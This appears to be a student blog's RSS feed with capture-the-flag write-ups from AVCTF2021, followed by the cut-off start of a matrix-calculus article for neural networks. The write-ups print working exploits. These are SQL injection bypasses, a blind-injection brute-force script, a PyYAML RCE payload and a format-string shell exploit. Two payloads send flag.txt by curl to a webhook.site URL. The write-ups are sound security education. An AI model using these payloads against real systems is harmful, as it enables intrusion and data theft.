<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Nush.app Blogposts]]></title><description><![CDATA[Featuring student-written articles on programming and internal events]]></description><link>https://nush.app</link><generator>RSS for Node</generator><lastBuildDate>Sat, 31 Dec 2022 09:18:19 GMT</lastBuildDate><atom:link href="https://nush.app/rss.xml" rel="self" type="application/rss+xml"/><language><![CDATA[en]]></language><item><title><![CDATA[[AVCTF2021] AppVenture Login Part 0]]></title><description><![CDATA[<blockquote>
<p>AppVenture Login page must be the most secure right? URL: <a href="http://35.240.143.82:4208/">http://35.240.143.82:4208/</a></p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p>What&#39;s the first thing you do when pentesting a website?</p>
</blockquote>
<p>One of the common files that websites contain is the <code>robots.txt</code>, which decides what scrapers like google-bot can see and should see.</p>
<p>In this case the robots contains a path to the source code of the website, and the flag is inside the source code.</p>
<h3 id="http35240143824208robotstxt"><a href="http://35.240.143.82:4208/robots.txt">http://35.240.143.82:4208/robots.txt</a></h3>
<pre><code>User-agent: *
Disallow: /c7179ef35b2d458d6f2f68044816e145/main.py
</code></pre>
<h3 id="http35240143824208c7179ef35b2d458d6f2f68044816e145mainpy"><a href="http://35.240.143.82:4208/c7179ef35b2d458d6f2f68044816e145/main.py">http://35.240.143.82:4208/c7179ef35b2d458d6f2f68044816e145/main.py</a></h3>
<pre><code>...
flag0 = &quot;flag{you_can_use_automated_tools_like_nikto_to_do_this}&quot;
...
</code></pre>
<p>Flag obtained</p>
]]></description><link>https://nush.app/blog/2021/12/21/avctf2021-av-login-p0</link><guid isPermaLink="true">https://nush.app/blog/2021/12/21/avctf2021-av-login-p0</guid><dc:creator><![CDATA[zhaoyun]]></dc:creator><pubDate>Tue, 21 Dec 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[[AVCTF2021] AppVenture Login Part 1]]></title><description><![CDATA[<blockquote>
<p>Well, I haven&#39;t taken CS6131 yet but databases should be easy right??</p>
</blockquote>
<p>From the description we can see the keyword databases, based on prior knowledge of the module CS6131, we can be pretty sure this is related to SQL.</p>
<p>Since the source operates on a simple template string SQL command, we can apply simple SQL injection and skip the password check.</p>
<pre><code class="language-python">@app.route(&quot;/login&quot;, methods=[&quot;post&quot;])
def login():
    username = request.form.get(&#39;username&#39;, default=&#39;&#39;, type=str)
    password = request.form.get(&#39;password&#39;, default=&#39;&#39;, type=str)
    users = db.execute(f&quot;select id from users where name=&#39;{username}&#39; and password=&#39;{password}&#39;&quot;).fetchall()
    if users:
        return Response(flag1, mimetype=&#39;text/plain&#39;)
    return Response(&#39;Login failed&#39;, mimetype=&#39;text/plain&#39;)
</code></pre>
<p>In SQL, comments can be made with <code>--</code></p>
<p>To skip the password check, we can simply input <code>admin&#39; --</code> in username and leave password blank, which would result in the following command</p>
<pre><code class="language-sql">select id from users where name=&#39;admin&#39; --&#39; and password=&#39;&#39;
</code></pre>
<p>Everything behind <code>--</code> is ignored and we successfully log in as admin</p>
<h3 id="http35240143824208login"><a href="http://35.240.143.82:4208/login">http://35.240.143.82:4208/login</a></h3>
<pre><code>flag{you_can_pass_cs6131_now}
</code></pre>
<p>Flag obtained</p>
]]></description><link>https://nush.app/blog/2021/12/21/avctf2021-av-login-p1</link><guid isPermaLink="true">https://nush.app/blog/2021/12/21/avctf2021-av-login-p1</guid><dc:creator><![CDATA[zhaoyun]]></dc:creator><pubDate>Tue, 21 Dec 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[[AVCTF2021] AppVenture Login Part 2]]></title><description><![CDATA[<blockquote>
<p>Ok, you got the flag, but I bet you&#39;ll never get my password!</p>
</blockquote>
<p>Basing off the description, the flag is probably the password. Even though we logged in as admin in the last challenge, we do not know of the password.</p>
<p>To get the password, we can check the password 1 character at a time to reduce the number of tries. Trying the entire password string at a time require exponential amount of tries and will be unrealistic.</p>
<p>The flag format is <code>flag{...}</code> where characters consist of lower case letters, <code>{}</code> and <code>_</code>. We can quickly code up a little script to find the password. In this writeup we will be using <code>node.js</code> for the simplicity and non-pythonic syntax.</p>
<pre><code class="language-js">const fetch = require(&quot;node-fetch&quot;);
const FormData = require(&#39;form-data&#39;);

let chars = &quot;abcdefghijklmnopqrstuvwxyz_{}&quot;.split(&#39;&#39;);
let password = [];

async function verify(i, c) {
    const form = new FormData();
    form.append(&#39;username&#39;, `admin&#39; and SUBSTRING(password, ${i + 1}, 1)=&#39;${c}&#39; --`);
    const res = await fetch(&#39;http://35.240.143.82:4208/login&#39;, {method: &#39;POST&#39;, body: form})
    const text = await res.text();
    return text !== &quot;Login failed&quot;
}

async function step(i) {
    for (let c of chars) {
        if (await verify(i, c)) return c;
    }
    return null;
}

async function brute_force() {
    let i = 0;
    while (true) {
        password[i] = await step(i);
        console.log(password.join(&#39;&#39;));
        if (!password[i]) break;
        i++;
    }
    console.log(password.join(&#39;&#39;));
}

brute_force();
</code></pre>
<p>As before we use <code>admin&#39;</code> to escape the admin field, and <code>--</code> to skip the password check.</p>
<p>However we add our own check in the middle, <code>SUBSTRING(password, i, 1)</code> works the same as normal substring would but sql is 1-indexed(kinda weird but yeh)</p>
<p>What would happen would be like this</p>
<ul>
<li><code>select id from users where name=&#39;admin&#39; and SUBSTRING(password, 1, 1)=&#39;a&#39; --</code> fail</li>
<li><code>select id from users where name=&#39;admin&#39; and SUBSTRING(password, 1, 1)=&#39;b&#39; --</code> fail</li>
<li>...</li>
<li><code>select id from users where name=&#39;admin&#39; and SUBSTRING(password, 1, 1)=&#39;f&#39; --</code> success</li>
<li><code>select id from users where name=&#39;admin&#39; and SUBSTRING(password, 2, 1)=&#39;a&#39; --</code> fail</li>
<li>...</li>
</ul>
<p><code>verify</code> will make a request to check if the password has character in variable <code>c</code> at position <code>i</code>.</p>
<p><code>step</code> will simply try all characters for a position until one hits.</p>
<p><code>brute_force()</code> will step through all positions until a correct character can&#39;t be found for the position, which would be most likely the end of the password</p>
<h3 id="running-the-script">Running the script</h3>
<pre><code>f
fl
fla
...
flag{oops_looks_like_youre_not_blind
flag{oops_looks_like_youre_not_blind}
flag{oops_looks_like_youre_not_blind}
flag{oops_looks_like_youre_not_blind}
</code></pre>
<p>Flag obtained</p>
]]></description><link>https://nush.app/blog/2021/12/21/avctf2021-av-login-p2</link><guid isPermaLink="true">https://nush.app/blog/2021/12/21/avctf2021-av-login-p2</guid><dc:creator><![CDATA[zhaoyun]]></dc:creator><pubDate>Tue, 21 Dec 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[[AVCTF2021] Espace 0]]></title><description><![CDATA[<p>The hardest challenge of the web category, but was actually solved before Login Part 0 since my brain was dead</p>
<blockquote>
<p>You&#39;ve used espace2, but what about espace0?</p>
<p>Flag in <code>flag.txt</code></p>
<p>URL: <a href="http://35.240.143.82:4210/">http://35.240.143.82:4210/</a></p>
</blockquote>
<p>As before the source, <code>main.py</code> was given</p>
<pre><code class="language-python">from flask import Flask, request, render_template, Response
import yaml

app = Flask(__name__)
assert yaml.__version__ == &quot;5.3.1&quot;

@app.route(&quot;/&quot;)
def index():
    return render_template(&quot;./index.html&quot;)
    
@app.route(&quot;/&quot;, methods=[&quot;POST&quot;])
def welcome():
    student_data = request.form.get(&quot;student_data&quot;)
    if not student_data:
        return Response(&quot;Please specify some data in YAML format&quot;, mimetype=&#39;text/plain&#39;)
    student_data = yaml.load(student_data)
    required_fields = [&quot;id&quot;,&quot;name&quot;,&quot;class&quot;]
    if type(student_data) != dict or &quot;student&quot; not in student_data or any(x not in student_data[&quot;student&quot;] for x in required_fields):
        return Response(&quot;Malformed data. Please try again.&quot;, mimetype=&#39;text/plain&#39;)
    student = student_data[&quot;student&quot;]
    return f&quot;&lt;h1&gt;Welcome, {student[&#39;name&#39;]} ({student[&#39;id&#39;]})&lt;/h1&gt; &lt;br&gt;Your class is &lt;b&gt;{student[&#39;class&#39;]}&lt;/b&gt;&quot;
</code></pre>
<p>There are no obvious vulnerabilities to this file.</p>
<p>But the <code>assert yaml.__version__ == &quot;5.3.1&quot;</code> part is quite suspicious.</p>
<p>A quick google search with keywords <code>pyyaml 5.3.1 vulnerabilities</code> leads us to <code>https://security.snyk.io/vuln/SNYK-PYTHON-PYYAML-590151</code>, a 9.8 scored RCE.</p>
<p>Conveniently a <code>uiuctf</code> writeup was included that explained how the exploit worked. <a href="https://hackmd.io/@harrier/uiuctf20">https://hackmd.io/@harrier/uiuctf20</a></p>
<p>Apparently it was a zero day vulnerability used in a CTF, what a chad move. We can simply take their payload and use it here as google is allowed in CTFs.</p>
<p><code>!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &#39;PAYLOAD_HERE&#39; ]]]</code></p>
<h3 id="sending-the-payload">Sending the payload</h3>
<p><code>!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &#39;__import__(&quot;os&quot;).system(&quot;curl -X POST --data-binary @flag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9&quot;)&#39; ]]]</code></p>
<p><img src="./image-20211221164628024.png" alt="image-20211221164628024"></p>
<p>And after checking webhook.site for the received curl request</p>
<pre><code>flag{yet_another_mal-coded_library}
</code></pre>
<p>Flag obtained</p>
]]></description><link>https://nush.app/blog/2021/12/21/avctf2021-espace-0</link><guid isPermaLink="true">https://nush.app/blog/2021/12/21/avctf2021-espace-0</guid><dc:creator><![CDATA[zhaoyun]]></dc:creator><pubDate>Tue, 21 Dec 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[[AVCTF2021] Printwriter 1]]></title><description><![CDATA[<blockquote>
<p>My wonderful app works both as an echo server and a file lister!</p>
<p>Bet you can&#39;t hack it! <code>nc 35.240.143.82 4203</code></p>
</blockquote>
<p>Only the compiled <code>chal</code> file was given, after decompiling it with Ghidra, I get</p>
<pre><code class="language-cpp">undefined8 main(void)
{
    int32_t iVar1;
    char *format;
    
    setup();
    while( true ) {
        fgets(&amp;format, 0x70, _stdin);
        iVar1 = strncmp(&amp;format, &quot;quit&quot;, 4);
        if (iVar1 == 0) break;
        printf(&amp;format);
    }
    system(&quot;/bin/ls&quot;);
    return 0;
}
</code></pre>
<p>As I can see, and <code>printf</code> has been used to print the output directly.</p>
<p>This challenge is in the format string attack category, which I can verify with a simple <code>%x</code></p>
<pre><code>$ nc 35.240.143.82 4203
%x
402004
%s
quit
</code></pre>
<h3 id="pwntools">pwntools</h3>
<p>I can use pwntools to quickly create our format string payload</p>
<h4 id="offset">offset</h4>
<p>I first have to find the offset which can be easily done with</p>
<pre><code class="language-python">from pwn import *

conn = remote(&quot;35.240.143.82&quot;, 4203)
context.clear(arch=&#39;amd64&#39;)


def send_payload(p):
    conn.wait(1)
    conn.sendline(p)
    return conn.recv()


print(&quot;offset =&quot;, FmtStr(execute_fmt=send_payload).offset)
</code></pre>
<pre><code>[x] Opening connection to 35.240.143.82 on port 4203
[x] Opening connection to 35.240.143.82 on port 4203: Trying 35.240.143.82
[+] Opening connection to 35.240.143.82 on port 4203: Done
[*] Found format string offset: 6
offset = 6
[*] Closed connection to 35.240.143.82 port 4203
</code></pre>
<h4 id="what-attack-to-use">what attack to use</h4>
<p>In the decompiler, I noticed how <code>/bin/ls/</code> is located at <code>0x00404058</code></p>
<p> <img src="./image-20211221173130465.png" alt="image-20211221173130465"></p>
<p>If I edit <code>/bin/ls/</code> into <code>/bin/sh</code>, as they have same amount of characters, I can gain remote shell access.</p>
<p>Hence I will be using <code>fmtstr_payload</code> from pwntools</p>
<h4 id="payload">payload</h4>
<pre><code class="language-python">from pwn import *

conn = remote(&quot;35.240.143.82&quot;, 4203)

context.clear(arch=&#39;amd64&#39;)
payload = fmtstr_payload(0x6, {0x404058: b&#39;/bin/sh&#39;}, write_size=&#39;short&#39;)
conn.wait(1)
print(&quot;sending&quot; + str(payload))
conn.sendline(payload)
print(conn.recv())
conn.sendline(&quot;quit&quot;)
conn.interactive()
</code></pre>
<p>We will be writing the string <code>/bin/sh</code> to address <code>0x404058</code> with offset <code>6</code>.</p>
<p>After sending the payload, <code>/bin/ls</code> will be changed to <code>/bin/sh</code>. This means that after I exit the loop with <code>quit</code>, it should give us shell access.</p>
<p>I will then switch to interactive to more easily take advantage of the shell.</p>
<pre><code class="language-cpp">system(&quot;/bin/sh&quot;);
</code></pre>
<p>Indeed we gain remote shell access.</p>
<p>By running the command <code>ls</code>, I find <code>flag.txt</code>, and with <code>cat flag.txt</code></p>
<pre><code>cat flag.txt
flag{why_would_printf_be_able_to_write_memory????!!}
</code></pre>
<p>Flag obtained</p>
<blockquote>
<p>If you run the following you can find the message I left</p>
<pre><code>cd ~
cd w
cat README.txt
Hello, I was here ;) ZY
</code></pre>
</blockquote>
]]></description><link>https://nush.app/blog/2021/12/21/avctf2021-printwriter</link><guid isPermaLink="true">https://nush.app/blog/2021/12/21/avctf2021-printwriter</guid><dc:creator><![CDATA[zhaoyun]]></dc:creator><pubDate>Tue, 21 Dec 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[[AVCTF2021] Super Secure Trustable Implementation]]></title><description><![CDATA[<blockquote>
<p>I&#39;ve added a bunch of filters, so my app must be really secure now.</p>
<p>Flag in <code>flag.txt</code></p>
<p>URL: <a href="http://35.240.143.82:4209/">http://35.240.143.82:4209/</a></p>
</blockquote>
<p>The source, <code>main.py</code> is included hence we should take a look.</p>
<pre><code class="language-python">import secrets
from flask import Flask, render_template_string, request

app = Flask(__name__)


@app.route(&quot;/&quot;)
def index():
    name = request.args.get(&quot;name&quot;, default=&quot;World&quot;)
    # Evil hacker cannot get past now!
    blocklist = [&quot;{{&quot;, &quot;}}&quot;, &quot;__&quot;, &quot;subprocess&quot;, &quot;flag&quot;, &quot;popen&quot;, &quot;system&quot;, &quot;os&quot;, &quot;import&quot;, &quot;read&quot;, &quot;flag.txt&quot;]
    for bad in blocklist:
        name = name.replace(bad, &quot;&quot;)
    return render_template_string(f&quot;&lt;h1&gt; Hello, {name}&quot;)
</code></pre>
<p>Since the server uses <code>render_template_string</code> it&#39;s vulnerable to <code>{{}}</code> template string attacks.</p>
<p>If we use <code>{{ &#39;Hello&#39;+&#39; &#39;+&#39;World&#39; }}</code> for name, it would give us <code>Hello World</code> as the string inside is ran as code.</p>
<h3 id="blocklist-bypass">Blocklist Bypass</h3>
<p>However as we can see, there is an blocklist, and it includes <code>{{</code> and <code>}}</code>.</p>
<p>To bypass this filter we can simply insert blocklisted words inside of blocklisted words. For example</p>
<p><code>{flag{}flag}</code> will not trigger when checking for <code>{{</code> and <code>}}</code>, but will have <code>flag</code> removed when checking for flag, and would result in <code>{{}}</code> as the end output.</p>
<p>Making use of this, we can construct our payloads with the help of a little script.</p>
<blockquote>
<p>I had troubles with reading the file so I decided to just send the file content via curl</p>
<p>webhook.site is a easy to use site for sending data back</p>
</blockquote>
<pre><code class="language-python">bypass = [&quot;{{&quot;, &quot;}}&quot;, &quot;__&quot;, &quot;subprocess&quot;, &quot;flag&quot;, &quot;popen&quot;, &quot;system&quot;, &quot;os&quot;, &quot;import&quot;, &quot;read&quot;]
bypass.reverse()
payload = &#39;&#39;
for toby in bypass:
    payload = payload.replace(toby, toby[0] + &quot;read&quot; + toby[1:])
print(payload)
name = payload
blocklist = [&quot;{{&quot;, &quot;}}&quot;, &quot;__&quot;, &quot;subprocess&quot;, &quot;flag&quot;, &quot;popen&quot;, &quot;system&quot;, &quot;os&quot;, &quot;import&quot;, &quot;read&quot;, &quot;flag.txt&quot;]
for bad in blocklist:
    name = name.replace(bad, &quot;&quot;)
print(f&quot;&lt;h1&gt; Hello, {name}&quot;)
</code></pre>
<h3 id="bypassing-certain-unknown-filters">Bypassing certain unknown filters</h3>
<p>If one simply use <code>__import__</code>, one will soon realise that it does not exist, this could have been done by deleting built-ins from the python run time.</p>
<p>We can restore the built-ins via <code>reload(__builtins__)</code>, however it is obviously, also deleted.</p>
<p>We need to find <code>__import__</code> somehow.</p>
<p>With some experimenting, we can find that</p>
<pre><code class="language-python">&gt;&gt;&gt; ().__class__.__bases__
(&lt;type &#39;object&#39;&gt;,)
</code></pre>
<p>The tuple inherits directly from <code>object</code>, hence we can find the list of types (extends object) by sending the payload </p>
<h5 id="__class____bases__0__subclasses__"><code>{{().__class__.__bases__[0].__subclasses__()}}</code></h5>
<pre><code>Hello, [&lt;class &#39;type&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytes&#39;&gt;... &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;]
</code></pre>
<p>Much of the output is useless, <code>_frozen_importlib_external.FileLoader</code> looks a bit suspicious though. (it is at position 118)</p>
<h5 id="__class____bases__0__subclasses__118"><code>{{().__class__.__bases__[0].__subclasses__()[118]}}</code></h5>
<pre><code>Hello, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;
</code></pre>
<p>Just verifying that the class is the <code>FileLoader</code>, now lets see what builtins this FileLoader has</p>
<h5 id="__class____bases__0__subclasses__118__init____globals____builtins__"><code>{{().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&quot;__builtins__&quot;]}}</code></h5>
<pre><code>Hello, {&#39;__name__&#39;: &#39;builtins&#39; ... &#39;__import__&#39;: &lt;built-in function __import__&gt;,  ...help, or help(object) for help about object.}
</code></pre>
<p><strong>Hooray!</strong> We found <code>__import__</code>, now we just have to combine the payload into</p>
<pre><code class="language-python">{{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&quot;__builtins__&quot;])[&quot;__im&quot;+&quot;port__&quot;](&quot;o&quot;+&quot;s&quot;).system(&quot;curl -X POST --data-binary @flflag.txtag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9&quot;)}}
</code></pre>
<p><code>flag.txt</code> is manually bypassed since it contains <code>flag</code></p>
<h3 id="transforming-the-payload">Transforming the payload</h3>
<pre><code>{read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_[&quot;_read_builtins_read_&quot;])[&quot;_read_im&quot;+&quot;port_read_&quot;](&quot;o&quot;+&quot;s&quot;).sreadystem(&quot;curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9&quot;)}read}

&lt;h1&gt; Hello, {{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&quot;__builtins__&quot;])[&quot;__im&quot;+&quot;port__&quot;](&quot;o&quot;+&quot;s&quot;).system(&quot;curl -X POST --data-binary @flag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9&quot;)}}
</code></pre>
<p>The first line is our payload, and after running the same blocklist operations as the server, the resulting string looks ok.</p>
<h3 id="sending-the-payload">Sending the payload</h3>
<p><code>http://35.240.143.82:4209/?name={read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_[&quot;_read_builtins_read_&quot;])[&quot;_read_im&quot;+&quot;port_read_&quot;](&quot;o&quot;+&quot;s&quot;).sreadystem(&quot;curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9&quot;)}read}</code></p>
<p>And after checking webhook.site</p>
<pre><code>flag{server_side_rendering_is_fun_but_dangerous_sometimes}
</code></pre>
<p>Flag obtained</p>
]]></description><link>https://nush.app/blog/2021/12/21/avctf2021-ssti</link><guid isPermaLink="true">https://nush.app/blog/2021/12/21/avctf2021-ssti</guid><dc:creator><![CDATA[zhaoyun]]></dc:creator><pubDate>Tue, 21 Dec 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[Building Convolutional Neural Networks from Scratch - Part 1 (Matrix Calculus)]]></title><description><![CDATA[<h1 id="mathematics">Mathematics</h1>
<p><strong>Mathematics</strong> is an area of knowledge, which includes the study of such topics as numbers, formulas and related structures, shapes and spaces in which they are contained, and quantities and their changes. There is no general consensus about its exact scope or epistemological status. However, it is extremely labourious and time-consuming but necessary and is sometimes (albeit very rarely) interesting.</p>
<p>Neural Networks are somewhat interesting. Everyone kind of knows the math behind NNs (the gist of it). It was taught in <strong>CS5131</strong> to a very limited extent but not many know about the full math behind deep and convolutional neural networks. I mean people get that it has something to do with backpropogation or whatever, but how do you scale it up to multiple value and multiple derivatives. As you will come to learn, these derivations are incredibly computationally intensive and time-consuming, especially during implementation. But I have done it because I care about AppVenture and I want to help the casual onlooker understand the many trials and tribulations a simple layer goes through to deliver what we should consider peak perfection. It was a fun but painful exercise and I gained a deeper understanding of the mathematical constructs that embody our world. Anyways, let&#39;s start out with a referesher. Warning that Matrix Math lurks ahead, so tread with caution. This is deeper than <strong>CS5131</strong> could have ever hoped to cover, so you will learn some stuff with this excercise. This first part is about the math behind deep neural networks.</p>
<p>This article is written with some assumed knowledge of the reader but it is not that bad for most CS students especially since NNs are baby level for the most part. Nonetheless, assumed knowledge is written below.</p>
<ul>
<li>Deep Neural Network (How to implement + basic understanding of the math)</li>
<li>Gradient Descent</li>
<li>Linear Algebra</li>
</ul>
<p>If you don&#39;t know this stuff, all you really need to do is read an introduction to linear algebra, understand how matrices and vectors are multiplied and watch 3b1b&#39;s series on machine learning.</p>
<p>Let&#39;s start by importing our bff for life, <strong>Numpy</strong>.</p>
<pre><code class="language-python">&gt;&gt;&gt; import numpy as np
</code></pre>
<p>Numpy is introduced in CS4132 (or PC6432 for some reason), but for a quick summary, it is a Linear Algebra library, which means it is VERY useful in this task.</p>
<h2 id="gradient-descent-example-linear-system-solution">Gradient Descent Example (Linear System Solution)</h2>
<p>Observe the following series of mathematical equations:</p>
<p>$$
\begin{aligned}
4a+2b&amp;=22\
3a+8b&amp;=49
\end{aligned}
$$</p>
<p>Despite the fact that solving these is pretty easy (as we learnt in Year 1), let&#39;s try going with a different solution from what is usually portrayed. Let&#39;s try using <strong>gradient descent</strong>.</p>
<p>If you remember, Gradient Descent is a method used to solve any sort of equation by taking steps towards the real value by using calculus to predict the direction and size of the step. Essentially if you remember in calculus, the minimum of the graph will have a tangent of slope 0 and hence we can understand the direction of these &quot;steps&quot; to solve the problem. We just need a function where the derivative and function result approach 0 as you get closer to the true solution. This function is known as the objective function.</p>
<p>As you probably know, a linear equation is written as such:</p>
<p>$$
A \mathbf{x}-\mathbf{b}=0
$$</p>
<p>where $A$ is a known square matrix, $\mathbf{b}$ is a known vector and $\mathbf{x}$ is an unknown vector.</p>
<p>In this case, for the objective function we will use Linear Least Squares (LLS) function as it is an accurate thing to minimize in this case written below. </p>
<p>$$F(\mathbf{x}) = {||A\mathbf{x}-\mathbf{b}||}_{2}^{2}$$</p>
<h3 id="matrix-calculus">Matrix Calculus</h3>
<p>Now, what do the weird lines and two occurences of &quot;2&quot; above mean and how exactly do we calculate the derivative of a scalar in terms of a vector? Well we have to learn matrix calculus, a very peculiar domain of math that is very torturous. Ideally, you want to avoid this at all cost, but I will do a gentle walk through this stuff.</p>
<p>Firstly, let&#39;s revise derivatives wth this simple example:</p>
<p>$$
\begin{aligned}
y&amp;=sin(x^2)+5\
\frac{dy}{dx}&amp;=\frac{d}{dx}\left(sin(x^2)+5\right)\
&amp;=2xcos(x^2)
\end{aligned}
$$</p>
<p>For functions with multiple variables, we can find the partial derivative with respect to each of the variables, as shown below:
$$
\begin{aligned}
f(x,y)&amp;=3xy+x^2\
\frac{\partial f(x,y)}{\partial x}&amp;=3y+2x\
\frac{\partial f(x,y)}{\partial y}&amp;=3x
\end{aligned}
$$</p>
<p>A thing to understand is that vectors are just a collection of numbers, so an n-sized vector will have n partial derivatives if the function is $f:\mathbb{R}^{n} \rightarrow \mathbb{R}$ (the derivative is known as the gradient). But do we represent these n partial derivatives as a column vector or row vector?</p>
<p>$$\frac{\partial y}{\partial\mathbf{x}} = 
\begin{bmatrix}
\frac{\partial y}{\partial{\mathbf{x}}<em>{1}}\
\frac{\partial y}{\partial{\mathbf{x}}</em>{2}}\
\vdots\
\frac{\partial y}{\partial{\mathbf{x}}_{n}}\
\end{bmatrix}
$$</p>
<p>$$
\frac{\partial y}{\partial\mathbf{x}} = 
\begin{bmatrix}
\frac{\partial y}{\partial{\mathbf{x}}<em>{1}} &amp; \frac{\partial y}{\partial{\mathbf{x}}</em>{2}} &amp; \cdots &amp; \frac{\partial y}{\partial{\mathbf{x}}_{n}}
\end{bmatrix}
$$</p>
<p>Well, both actually can work (even if you think of a vector as a column vector), the first version is called the denominator layout and the second one is called the numerator layout. They are both transpositions of each other. For gradient descent the denominator layout is more natural because for standard practice because we think of a vector as a column vector. I also prefer the denominator layout. However, the numerator layout follows the rules of single variable calculus more normally and will be much easier to follow. For example, matrices do not have commutative multiplication so the direction you chain terms matters. We naturally think of chaining terms to the back and this is true for numerator layout but in denominator layout terms are chained to the front. Product rule also is more funny when it comes to denom layout. So moving forward we will stick with the numerator layout and transpose the matrix or vector once the derivative is found. We will also stick to column vectors.</p>
<p>First lets look at the $A\mathbf{x}-\mathbf{b}$ term and we will see why the derivative is so and so with a simple $2 \times 2$ case. $A\mathbf{x}-\mathbf{b}$ is a $f:\mathbb{R}^{n} \rightarrow \mathbb{R}^{n}$ and hence the derivative will be a matrix (known as the Jacobian to many). Lets first, see the general equation and work it out for every value.</p>
<h2 id="-beginaligned-mathbfy--amathbfx-mathbfb-beginbmatrix-mathbfy1--mathbfy2-endbmatrix--beginbmatrix-a11--a12-a21--a22-endbmatrix-beginbmatrix-mathbfx1--mathbfx2-endbmatrix">$$
\begin{aligned}
\mathbf{y} &amp;= A\mathbf{x}-\mathbf{b}\
\begin{bmatrix}
{\mathbf{y}}<em>{1} \
{\mathbf{y}}</em>{2}
\end{bmatrix}
&amp;=
\begin{bmatrix}
{a}<em>{11} &amp; {a}</em>{12}\
{a}<em>{21} &amp; {a}</em>{22}\
\end{bmatrix}
\begin{bmatrix}
{\mathbf{x}}<em>{1} \
{\mathbf{x}}</em>{2}
\end{bmatrix}</h2>
<p>\begin{bmatrix}
{\mathbf{b}}<em>{1} \
{\mathbf{b}}</em>{2}
\end{bmatrix} \
&amp;=
\begin{bmatrix}
{a}<em>{11}{\mathbf{x}}</em>{1} + {a}<em>{12}{\mathbf{x}}</em>{2}-{\mathbf{b}}<em>{1} \
{a}</em>{21}{\mathbf{x}}<em>{1} + {a}</em>{22}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{2}
\end{bmatrix}
\end{aligned}
$$</p>
<p>Now we calculate the Jacobian (remember that it is transposed) by calculating the individual derivative for every value.</p>
<p>$$
\begin{aligned}
\frac{\partial \mathbf{y}}{\partial \mathbf{x}} &amp;=
\begin{bmatrix}
\frac{\partial {\mathbf{y}}<em>{1}}{\partial{\mathbf{x}}</em>{1}} &amp; \frac{\partial {\mathbf{y}}<em>{1}}{\partial{\mathbf{x}}</em>{2}}\
\frac{\partial {\mathbf{y}}<em>{2}}{\partial{\mathbf{x}}</em>{1}} &amp; \frac{\partial {\mathbf{y}}<em>{2}}{\partial{\mathbf{x}}</em>{2}}\
\end{bmatrix} \
\frac{\partial {\mathbf{y}}<em>{1}}{\partial{\mathbf{x}}</em>{1}} &amp;= {a}<em>{11}\
\frac{\partial {\mathbf{y}}</em>{1}}{\partial{\mathbf{x}}<em>{2}} &amp;= {a}</em>{12}\
\frac{\partial {\mathbf{y}}<em>{2}}{\partial{\mathbf{x}}</em>{1}} &amp;= {a}<em>{21}\
\frac{\partial {\mathbf{y}}</em>{2}}{\partial{\mathbf{x}}<em>{2}} &amp;= {a}</em>{22}\
\frac{\partial \mathbf{y}}{\partial \mathbf{x}} &amp;= 
\begin{bmatrix}
{a}<em>{11} &amp; {a}</em>{12}\
{a}<em>{21} &amp; {a}</em>{22}\
\end{bmatrix}
= A
\end{aligned}
$$</p>
<p>We see that it is kind of the same with single variable, where if we have $f(x)=ax$, then $f&#39;(x)=a$ where a is constant.</p>
<p>Now we look at the lines and &quot;2&quot;s. This is a common function known as the euclidean norm or 2-norm.</p>
<p>$$|{\mathbf {x}}|<em>{2}:={\sqrt {x</em>{1}^{2}+\cdots +x_{n}^{2}}}$$</p>
<p>We then square it giving rise to the second &quot;2&quot;. Now we define and do the same thing we did with $Ax-b$, $|{\mathbf {y}}|_{2}^{2}$ is $f:\mathbb{R}^{n} \rightarrow \mathbb{R}$. Hence, the derivative is a row vector.</p>
<p>$$
\begin{aligned}
z&amp;=|{\mathbf {y}}|<em>{2}^{2}\
&amp;={\mathbf {y}}</em>{1}^{2} + {\mathbf {y}}_{2}^{2}
\end{aligned}
$$</p>
<p>Now we calculate the Gradient (remember that it is transposed) by calculating the individual derivative for every value.</p>
<p>$$
\begin{aligned}
\frac{\partial F(\mathbf{x})}{\partial\mathbf{y}} &amp;=
\begin{bmatrix}
\frac{\partial F(\mathbf{x})}{\partial{\mathbf{y}}<em>{1}} &amp; \frac{\partial F(\mathbf{x})}{\partial{\mathbf{y}}</em>{2}}
\end{bmatrix} \
\frac{\partial F(\mathbf{x})}{\partial{\mathbf{y}}<em>{1}} &amp;= 2\mathbf{y}</em>{1} \
\frac{\partial F(\mathbf{x})}{\partial{\mathbf{y}}<em>{2}} &amp;= 2\mathbf{y}</em>{2} \
\frac{\partial F(\mathbf{x})}{\partial\mathbf{y}} &amp;=
\begin{bmatrix}
2\mathbf{y}<em>{1} &amp; 2\mathbf{y}</em>{2}
\end{bmatrix}
= 2\mathbf{y}^{T}
\end{aligned}
$$</p>
<p>To illustrate the chain rule, I will calculate it individually and put it all together.</p>
<p>$$
\begin{aligned}
